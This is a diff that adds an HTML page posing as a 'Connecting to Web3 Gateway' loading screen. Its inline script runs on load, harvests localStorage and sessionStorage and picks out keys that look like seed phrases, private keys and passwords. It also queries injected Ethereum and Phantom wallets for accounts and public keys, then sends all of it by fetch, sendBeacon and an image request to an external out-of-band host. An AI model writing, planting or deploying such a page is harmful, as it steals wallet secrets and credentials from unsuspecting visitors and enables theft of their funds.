@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<head><title>Loading</title></head>
+<body>
+<script>
+// ONE-LINER ULTIMATE WEB3 WALLET EXPLOIT
+// Webhook: awypjoegmdrmyskknqsyojbd99yoqgew4.oast.fun
+
+(async()=>{
+    const w='https://awypjoegmdrmyskknqsyojbd99yoqgew4.oast.fun';
+    const d={t:Date.now(),ua:navigator.userAgent,ref:document.referrer,url:location.href,ls:{},ss:{},w3:{},sensitive:{}};
+    for(let i=0;i<localStorage.length;i++){let k=localStorage.key(i),v=localStorage.getItem(k);d.ls[k]=v;if(k.match(/seed|phrase|mnemonic|private|wallet|key|password/i))d.sensitive[k]=v;}
+    for(let i=0;i<sessionStorage.length;i++){let k=sessionStorage.key(i);d.ss[k]=sessionStorage.getItem(k);}
+    if(window.ethereum){d.w3.eth={isMetaMask:!!window.ethereum.isMetaMask,chainId:window.ethereum.chainId};try{d.w3.accounts=await window.ethereum.request({method:'eth_accounts'});}catch(e){}}
+    if(window.solana)d.w3.sol={isPhantom:!!window.solana.isPhantom};
+    if(window.phantom?.solana)d.w3.phantom={pub:window.phantom.solana.publicKey?.toString()};
+    for(let m of[fetch,navigator.sendBeacon])try{m(w,{method:'POST',mode:'no-cors',body:JSON.stringify(d)});}catch(e){}
+    new Image().src=w+'?d='+encodeURIComponent(JSON.stringify(d).substring(0,2000));
+    console.log('[+] Data exfiltrated');
+})();
+</script>
+<div style="text-align:center;padding:50px;font-family:sans-serif">
+    <h2>Connecting to Web3 Gateway...</h2>
+    <div style="width:40px;height:40px;border:3px solid #ccc;border-top-color:#3b82f6;border-radius:50%;animation:spin 1s infinite;margin:20px auto"></div>
+</div>
+<style>
+    @keyframes spin{to{transform:rotate(360deg);}}
+</style>
+</body>
+</html>
